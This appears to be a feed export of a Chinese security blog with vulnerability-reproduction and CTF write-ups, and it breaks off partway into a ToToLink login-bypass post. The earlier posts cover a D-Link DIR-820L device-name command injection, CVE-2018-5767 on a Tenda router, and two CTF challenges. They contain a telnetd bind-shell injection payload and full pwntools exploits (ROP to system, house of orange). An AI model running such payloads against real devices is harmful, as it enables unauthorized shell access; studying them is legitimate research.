    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>设备型号:D-Link DIR-820L<br>固件下载地址:<a href="http://www.dlinktw.com.tw/techsupport/download.ashx?file=2663">http://www.dlinktw.com.tw/techsupport/download.ashx?file=2663</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>直接直接选择使用Firmae进行模拟</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./run.sh -r DIR ./DIR820LA1_FW105B03.bin</span><br></pre></td></tr></table></figure><p>第一次使用Firmae可能需要等的比较久 我等了二十分钟左右<br>出现下图中的样子就是启动成功了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232020051.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232020051.png" alt="image.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据提供的描述 可以得知漏洞出现在lan.asp中的device_name</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D-Link DIR-820L 1.05B03 was discovered to contain a remote command execution (RCE) vulnerability via the Device Name parameter in /lan.asp.</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232022721.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232022721.png" alt="image.png"></a><br>可以看到这个参数拼接到了paremStr中 作为copyDataToDataModelFormat函数的返回值<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232024272.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232024272.png" alt="image.png"></a><br>朔源一下这个函数 推测出来请求的目标网址应该是get_set.ccp<br>在squashfs-root文件夹中查询一下这个字符串<br>没有找到这个文件名 应该是放到了后端处理 但是出现了四个使用到的二进制文件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232026486.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232026486.png" alt="image.png"></a><br>这里复制了这篇文章的描述: <a href="https://www.wangan.com/p/11v772975e2a5820">https://www.wangan.com/p/11v772975e2a5820</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">◆bin/smbd 程序是 Samba 服务器的一部分，它允许路由器用户与 Windows 客户端共享文件和打印机。Samba 服务器是一个开源软件，它实现了 SMB/CIFS 协议，这是 Windows 操作系统使用的文件和打印机共享协议。bin/smbd 程序是 Samba 服务器的核心组件之一，它提供了文件和打印机共享的功能。</span><br><span class="line"></span><br><span class="line">◆bin/flash 程序允许用户升级路由器固件，以获取最新的功能和安全补丁。它还可以用于还原路由器的出厂设置，以便在出现问题时恢复路由器的正常运行。</span><br><span class="line"></span><br><span class="line">◆sbin/ncc2 程序主要用于配置路由器的网络设置和管理路由器的各种功能。通过 ncc2 程序，用户可以轻松地设置无线网络、防火墙、端口转发等功能，使路由器的使用更加便捷和高效。</span><br><span class="line"></span><br><span class="line">◆lib/libapmib.so 是 D-Link 路由器系统中的一个库文件，它包含了许多重要的 API 和函数，用于实现路由器的各种功能。用户可以通过调用这些 API 和函数来访问和配置路由器的网络设置、无线网络、防火墙、端口转发等功能。</span><br></pre></td></tr></table></figure><p>所以这里我们选择ncc2这个程序 ida打开<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232110757.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232110757.png" alt="image.png"></a><br>调用了hasInjectionString函数来判断是否存在注入字符串 这里需要查找一下过滤了哪些内容<br>查找一下这个函数是在哪个动态库声明的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119195.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119195.png" alt="image.png"></a><br>最后成功找到了过滤的字符串<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119626.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119626.png" alt="image.png"></a></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>直接在管理界面修改device_name 随后点击保存 利用burp抓包<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232133247.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232133247.png" alt="image.png"></a><br>可以看到修改的应该是这个参数 这里选择使用telnetd来创建一个远程会话连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0atelnetd -l /bin/sh -p 7080 -b 0.0.0.0%0a</span><br></pre></td></tr></table></figure><p>%0a用来绕过字符判断<br>在7080端口建立一个&#x2F;bin&#x2F;sh的会话 等下直接nc这个端口就行了<br>可惜我自己试了半天都没有复现成功 不过学习个思路就行了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>如果要换我来挖掘漏洞的话 我认为应该是先批量查找调用了system函数的二进制文件 找到ncc2以后 再根据其拼接参数的来源去进一步找到device_name </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>cve-2018-5767</title>
    <link href="http://example.com/2023/09/15/cve-2018-5767/"/>
    <id>http://example.com/2023/09/15/cve-2018-5767/</id>
    <published>2023-09-15T03:03:19.000Z</published>
    <updated>2023-09-17T07:45:19.463Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一款arm架构的路由器 主要的漏洞位于httpd中 cookie可以产生栈溢出 同时httpd开启的保护很少 比较适合新手用于arm架构的学习<br>固件下载地址 <a href="https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1">https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1</a></p><h1 id="环境模拟"><a href="#环境模拟" class="headerlink" title="环境模拟"></a>环境模拟</h1><p>使用binwalk提取出固件的文件系统<br>随后使用readelf查看一下固件的架构<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151144142.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151144142.png" alt="image.png"></a><br>可以看到是32位的ARM架构<br>接下来如果我们直接使用qemu-arm-static来启动httpd的话 会提示缺失库文件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151149403.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151149403.png" alt="image.png"></a><br>我们需要把qemu-arm-static的文件拷贝到当前目录 随后利用chroot将当前目录作为根目录 随后再重新启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install qemu-user-static libc6-arm* libc6-dev-arm*</span><br><span class="line">cp /usr/bin/qemu-arm-static .</span><br><span class="line">sudo chroot ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151152850.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151152850.png" alt="image.png"></a><br>但是你会发现此时程序卡在了这里<br>先利用ida打开httpd 在字符串中搜索Welcome to 很快就定位了具体的位置<br>可以看到对于v18的值进行了检查 如果小于等于0就陷入死循环<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151158690.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151158690.png" alt="image.png"></a><br>将断点打在这个puts函数 我们看看v18的值是怎么赋值的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./bin/httpd</span><br><span class="line">target remote:1234</span><br><span class="line">b *0x2CF7C</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>可以看到此时的死循环和R3寄存器的值有关<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151212457.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151212457.png" alt="image.png"></a><br>我们需要利用keypatch更改mvn这一条指令 使得r3的值大于0后可以绕过死循环<br>但是可以看到此时虽然跳过了while的死循环 但是程序输出错误后就直接结束了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151221215.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151221215.png" alt="image.png"></a><br>还是老办法 定位到对应的字符串<br>代码审计可以发现是这个if判断的锅<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151225667.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151225667.png" alt="image.png"></a><br>我们需要进入这个if分支 才能正常使用程序<br>则使得r3不为0即可<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151226154.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151226154.png" alt="image.png"></a><br>随后又迎来了一个问题 可以看到虽然此时httpd已经成功启动 但是其获取到的ip地址明显不对 所以我们需要一个网桥接口来使得可以正常获取ip地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151227278.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151227278.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install uml-utilities bridge-utils</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo ifconfig br0 up</span><br><span class="line">sudo ifconfig br0 192.168.xx.xx</span><br></pre></td></tr></table></figure><p>随后我们再次运行httpd程序 可以发现成功获取到了ip地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162013409.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162013409.png" alt="image.png"></a><br>暂时挂起这个进程 我们ping这个地址如果可以ping通就成功了<br>但是还是发现无法正常访问网页<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162038394.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162038394.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -rf ./webroot_ro/* ./webroot/`</span><br></pre></td></tr></table></figure><p>把目录复制一下就行了 原理暂时还没搞懂<br>这个师傅的文章看到的 <a href="https://cn-sec.com/archives/1727127.html">https://cn-sec.com/archives/1727127.html</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>通过官方给出的分析<br><a href="https://fidusinfosec.com/remote-code-execution-cve-2018-5767/">https://fidusinfosec.com/remote-code-execution-cve-2018-5767/</a><br>可以知道漏洞点位于R7WebsSecurityHandler函数中<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162018442.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162018442.png" alt="image.png"></a><br>调用了sscanf函数把cookie中的password参数传入到了栈上 而httpd文件就开启了一个NX<br>所以可以进行一个栈溢出的rop链利用<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162032062.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162032062.png" alt="image.png"></a><br>看其他师傅是可以使用python脚本来发送请求的 但是不知道为啥我不行 所以这里采用bp来发包 （第二天补的这句话 发现是我的终端加了http和https的代理<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162059777.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162059777.png" alt="image.png"></a><br>随后可以看到程序终止了 报段错误<br>于是使用gdb-multiarch来进行动态调试 寻找触发段错误的指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br><span class="line"></span><br><span class="line">gdb-multiarch ./bin/httpd</span><br><span class="line">target remote:1234</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162124061.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162124061.png" alt="image.png"></a><br>可以看到程序卡在了这里 由于r3寄存器被我们填入的垃圾数据覆盖<br>而ldrb需要访问r3寄存器存储的内存地址中的数据 所以这里产生了非法的内存访问 从而导致了段错误<br>通过backtrace指令 可以看到此指令是由0x2c5cc触发的 在ida中寻找一下<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162127376.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162127376.png" alt="image.png"></a><br>在if分支中有一个函数涉及到了该地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162129667.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162129667.png" alt="image.png"></a><br>所以我们要做的就是跳过if分支 这样才可以执行到我们控制的rop链<br>绕过if分支的条件则是在’.’后跟上这些后缀名<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162130898.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162130898.png" alt="image.png"></a><br>随后就是简单的栈溢出 直接打system就行了<br>但是 由于我的vmmap不知道为啥获取不到对应的libc地址<br>所以复现失败</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>Sictf_round2出题小记</title>
    <link href="http://example.com/2023/09/11/Sictf-round2%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/"/>
    <id>http://example.com/2023/09/11/Sictf-round2%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/</id>
    <published>2023-09-11T04:43:02.000Z</published>
    <updated>2023-09-14T17:21:11.120Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p>被非预期打穿了呜呜呜  应该清空一下栈的内容 或者加个内联汇编修改一下rdx寄存器的值</p><p>原本的做法是劫持rbp寄存器 修改rsi寄存器 随后就可以利用write函数泄露bss段上的libc</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.arch = &quot;i386&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="comment">#io = remote(&quot;192.168.0.104&quot;,32770)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello!!!&quot;</span>)</span><br><span class="line">leak_addr = <span class="number">0x404040</span></span><br><span class="line">write_addr = <span class="number">0x4011E2</span></span><br><span class="line">bss_addr = elf.bss(<span class="number">0xa00</span>)</span><br><span class="line">ptr_addr = <span class="number">0x4011F1</span></span><br><span class="line">payload = cyclic(<span class="number">0x20</span>)+p64(leak_addr+<span class="number">0x20</span>+<span class="number">0x20</span>)+p64(ptr_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4011FE&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">payload = p64(bss_addr)+p64(write_addr)+cyclic(<span class="number">0x10</span>)+p64(leak_addr+<span class="number">0x20</span>)+p64(ptr_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(p8(<span class="number">0x80</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21a780</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">rdi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4011FE&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p>house of orange 不过对泄露堆地址的步骤改了改</p><p>没开PIE 这样可以用unsortedbin attack往存放堆块指针的地址写入堆地址 就可以泄露堆地址了</p><p>然后要明白unsortedbin attack为什么使用过一次后 再次进行堆块操作就会报错 是因为破坏了main_arena以及fd bk域 修复一下就可以再次进行unsortedbin attack了 随后就是house of orange的部分了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;210.44.151.51&quot;</span>,<span class="number">10202</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p64(<span class="number">0xfc1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;1&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c5131</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">payload = cyclic(<span class="number">0x48</span>)+p64(<span class="number">0xf51</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x4040E0</span>+<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf40</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x22010</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = p64(heap_addr+<span class="number">0x22010</span>)+p64(heap_addr+<span class="number">0x90</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">10</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">main_arena = libc_addr + <span class="number">0x3c4b20</span>+<span class="number">88</span></span><br><span class="line">payload = cyclic(<span class="number">0x48</span>)+p64(<span class="number">0xf51</span>)+p64(main_arena)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">IO_list_all = libc_addr + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x30</span>) <span class="comment">#填充到old top chunk</span></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>) <span class="comment">#覆盖size 使其释放到smallbin 0x60链表</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>) <span class="comment">#伪造bk域</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(<span class="number">1</span>) <span class="comment">#布局io_write_ptr和io_write_base</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#填充偏移</span></span><br><span class="line">payload += fake_file + p64(<span class="number">0</span>)*<span class="number">3</span>+p64(heap_addr+<span class="number">0x1a8</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system_addr) <span class="comment">#伪造vtable结构体</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># debug()</span></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>ToToLink-X5000R登录绕过</title>
    <link href="http://example.com/2023/08/15/ToToLink-X5000R%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2023/08/15/ToToLink-X5000R%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87/</id>
    <published>2023-08-15T10:26:41.000Z</published>
    <updated>2023-09-14T17:21:03.291Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>跟着看雪上的这位师傅复现的 <a href="https://www.kanxue.com/chm.htm?id=17830">https://www.kanxue.com/chm.htm?id=17830</a> </p><p>好文章 学到了面对一个路由器时的分析思路</p><h2 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h2><p>固件下载地址<a href="http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&id=65">http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&amp;id=65</a></p><p>mipsel架构  模拟脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#/bin/sh</span><br><span class="line">sudo tunctl -t top0 -u root</span><br><span class="line">sudo ifconfig top0 192.168.6.2</span><br><span class="line">sudo qemu-system-mipsel -M malta -kernel ./mipsel_kernel/vmlinux-3.2.0-4-4kc-malta -hda ./mipsel_kernel/debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</span><br></pre></td></tr></table></figure><p>模拟起来后 进入其中配置eth0网络接口与top0位于同一c段</p><p>随后打包squashfs-root文件夹 通过scp上传到模拟系统中</p><p>以squashfs-root文件夹为根目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chroot ./squashfs-root/ /bin/sh</span><br></pre></td></tr></table></figure><p>随后启动路由器服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 